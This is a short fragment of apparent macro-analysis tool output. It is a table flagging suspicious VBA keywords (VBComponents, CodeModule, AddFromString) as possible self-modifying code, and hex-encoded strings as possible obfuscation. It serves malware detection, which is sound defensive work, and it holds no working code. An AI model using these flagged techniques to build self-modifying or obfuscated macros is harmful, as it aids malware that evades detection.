|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

